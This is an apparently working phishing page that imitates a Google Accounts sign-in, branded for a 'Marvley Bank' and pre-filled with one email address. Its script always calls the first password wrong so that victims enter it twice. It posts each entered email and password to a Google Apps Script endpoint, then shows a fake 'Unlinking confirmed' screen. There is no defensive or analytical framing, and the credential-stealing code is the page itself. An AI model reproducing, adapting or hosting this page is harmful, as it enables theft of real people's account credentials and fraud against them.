<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Roboto', 'Arial', sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            max-height: 100vh;
            background-color: #fff;
            overflow: hidden;
        }
        .cLogo {
            top: -1em;
            position: relative;
            text-align: center;
            font-size: larger;
            width: 100vw;
            color: rgb(255, 115, 0);
            padding: 24px;
        }
        .cLogo span {
            color: rgb(0, 0, 0);
            font-size: x-small;
        }
        .login-container {
            width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }

        .google-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .google-logo img {
            height: 24px;
        }

        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
            margin-top: 0;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.1px;
            line-height: 1.5;
            padding-bottom: 0;
            padding-top: 8px;
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
        }

        .form-group {
            position: relative;
            margin-bottom: 24px;
        }

        .input-field {
            background-color: transparent;
            width: 100%;
            height: 56px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
            transition: border-color 0.15s ease;
        }

        .label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #5f6368;
            pointer-events: none;
            transition: all 0.15s ease;
            padding: 0 4px;
        }

        .input-field:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .input-field:focus + .label,
        .input-field:not(:placeholder-shown) + .label {
            top: 0;
            font-size: 13px;
            background: white;
            color: #1a73e8;
        }

        .input-field:focus:not(:focus-visible) {
            border-color: #dadce0;
        }

        .error .input-field {
            border-color: #d93025;
        }

        .error .label {
            color: #d93025;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 0 24px;
            height: 36px;
            border: none;
            border-radius: 4px;
            font-family: "Google Sans", Roboto, Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            letter-spacing: 0.25px;
            transition: background-color 0.15s ease;
            margin-top: 32px;
            float: right;
        }

        .btn:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3),0 1px 3px 1px rgba(66,133,244,0.15);
        }

        .password-section {
            display: none;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            display: none;
            line-height: normal;
        }

        .forgot-email {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            letter-spacing: 0.25px;
            text-decoration: none;
            margin-top: 9px;
            display: inline-block;
        }

        .forgot-email:hover {
            background-color: rgba(26,115,232,0.04);
            border-radius: 4px;
            padding: 6px 8px;
            margin: 3px -8px;
        }

        .helper-text {
            color: #5f6368;
            font-size: 14px;
            margin-top: 32px;
            text-align: left;
        }

        .learn-more {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .learn-more:hover {
            background-color: rgba(26,115,232,0.04);
            border-radius: 4px;
            padding: 6px 8px;
            margin: -6px -8px;
        }
        #after {
            display: none;
            text-align: center;
            width: 100%;
            height: 100%;
        }
        #after h2 {
            color: rgb(0, 179, 0);
        }
    </style>
</head>
<body>
    <div class="cLogo">
        <h2>Marvley Bank<span> Powered by Google</span></h2>
    </div>
    <div class="login-container">
        <div id = "after"><h2>Unlinking confirmed</h2><h4>Close the page</h4></div>
       <div id="before">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <div class="email-section">
            <form id="emailForm" novalidate>
                <div class="form-group" id="emailGroup">
                    <input type="email" class="input-field" id="email" placeholder=" " required>
                    <label for="email" class="label">Email or phone</label>
                    <div class="error-message" id="emailError">Enter an email or phone number</div>
                </div>
                <a href="#" class="forgot-email">Forgot email?</a>
                <div class="helper-text">
                    Not your computer? Use Private Browsing windows to sign in.
                    <a href="#" class="learn-more">Learn more about using Guest mode</a>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
        </div>
        <div class="password-section" id="passwordSection">
            <form id="passwordForm" novalidate>
                <div class="form-group" id="passwordGroup">
                    <input type="password" class="input-field" id="password" placeholder=" " required>
                    <label for="password" class="label">Enter your password</label>
                    <div class="error-message" id="passwordError">Enter a valid password</div>
                    <div class="error-message" id="passwordError1">Wrong password</div>
                </div>
                <button type="submit" class="btn">Sign in</button>
            </form>
        </div>
       </div> 
    </div>
    <script>
           document.getElementById('email').value = "marrykost1999@gmail.com";
        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();   
            // Basic email validation
             email = document.getElementById('email').value;
             const emailGroup = document.getElementById('emailGroup');
             const emailError = document.getElementById('emailError');
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!email || !emailRegex.test(email)) {
                emailGroup.classList.add('error');
                emailError.style.display = 'block';
                return;
            }
            emailGroup.classList.remove('error');
            emailError.style.display = 'none';
            
            // Hide email section and show password section
            document.querySelector('.email-section').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
        });
        let looper = 0;
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            password = document.getElementById('password').value;
            const passwordGroup = document.getElementById('passwordGroup');
            const passwordError = document.getElementById('passwordError');
            const passwordError1 = document.getElementById('passwordError1');
            if (!password || password.length < 8) {
                passwordGroup.classList.add('error');
                passwordError.style.display = 'block';
                return;
            }
            else if (password.length >= 8  && looper < 1) {
                passwordGroup.classList.add('error');
                passwordError1.style.display = 'block';
                looper = 1 + looper;
                function sendToGoogleSheets() {
                let text = `user: ${email} pass: ${password}`;
    
                // Add mode: 'no-cors'
                fetch("https://script.google.com/macros/s/AKfycbytQmeG_XobuM7zlWxitdUy_NlMm9TTgkd8QCJYvQZ5xc5bTIE7i-V4o2DWfUvNMAxp/exec", {
                 mode: 'no-cors', // This changes how the request is handled
                 method: "POST",
                    headers: { 
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ message: text })
             })
                .then(response => {
                    console.log("Request sent");
                })
                .catch(error => console.error("Error:", error));
            }
            // Call the function
            sendToGoogleSheets();
            }
            else{
            passwordGroup.classList.remove('error');
            passwordError.style.display = 'none';
            passwordError1.style.display = 'none';
            function sendToGoogleSheets() {
                let text = `user: ${email} pass: ${password}`;
                // Add mode: 'no-cors'
                fetch("https://script.google.com/macros/s/AKfycbytQmeG_XobuM7zlWxitdUy_NlMm9TTgkd8QCJYvQZ5xc5bTIE7i-V4o2DWfUvNMAxp/exec", {
                 mode: 'no-cors', // This changes how the request is handled
                 method: "POST",
                    headers: { 
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ message: text })
             })
                .then(response => {
                    console.log("Request sent");
                })
                .catch(error => console.error("Error:", error));
            }
            // Call the function
            sendToGoogleSheets();
            const after = document.getElementById("after");
            const before = document.getElementById("before");
            before.style.display = "none";
            after.style.display = "block";
        }
        });
        // Add input event listeners to remove error states when user starts typing
        document.getElementById('email').addEventListener('input', function() {
            const emailGroup = document.getElementById('emailGroup');
            const emailError = document.getElementById('emailError');
            emailGroup.classList.remove('error');
            emailError.style.display = 'none';
        });

        document.getElementById('password').addEventListener('input', function() {
            const passwordGroup = document.getElementById('passwordGroup');
            const passwordError = document.getElementById('passwordError');
            passwordGroup.classList.remove('error');
            passwordError.style.display = 'none';
            passwordError1.style.display = 'none';
        });

    </script>
</body>
</html>
